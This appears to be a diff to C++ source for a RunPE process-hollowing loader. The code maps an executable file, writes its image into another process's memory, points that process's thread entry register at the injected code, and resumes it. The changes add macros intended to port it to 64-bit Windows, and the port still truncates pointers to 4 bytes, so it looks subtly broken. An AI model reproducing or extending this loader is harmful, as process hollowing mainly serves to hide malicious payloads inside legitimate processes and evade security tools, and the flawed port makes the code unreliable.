@@ -5,22 +5,24 @@
 #include <Windows.h> // WinAPI Header
 #include <TlHelp32.h> //WinAPI Process API
 
+#ifdef _WIN64
+	#define CONTEXTAX(CTX) CTX->Rax
+	#define CONTEXTBX(CTX) CTX->Rbx
+#else
+	#define CONTEXTAX(CTX) CTX->Eax
+	#define CONTEXTBX(CTX) CTX->Ebx
+#endif
 
 // use this if you want to read the executable from disk
-HANDLE MapFileToMemory(LPCSTR filename)
-{
+HANDLE MapFileToMemory(LPCSTR filename){
 	std::streampos size;
 	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
-	if (file.is_open())
-	{
+	if (file.is_open()){
 		size = file.tellg();
-
 		char* Memblock = new char[size]();
-
 		file.seekg(0, std::ios::beg);
 		file.read(Memblock, size);
 		file.close();
-
 		return Memblock;
 	}
 	return 0;
@@ -64,7 +66,7 @@ int RunPortableExecutable(void* Image)
 			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
 			{
 				// Read instructions
-				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
+				ReadProcessMemory(PI.hProcess, LPCVOID(CONTEXTBX(CTX) + 8), LPVOID(&ImageBase), 4, 0);
 
 				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
 					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
@@ -79,11 +81,11 @@ int RunPortableExecutable(void* Image)
 					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
 						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
 				}
-				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
+				WriteProcessMemory(PI.hProcess, LPVOID(CONTEXTBX(CTX) + 8),
 					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
 				
 				// Move address of entry point to the eax register
-				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+				CONTEXTAX(CTX) = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
 				ResumeThread(PI.hThread); //´Start the process/call main()
 
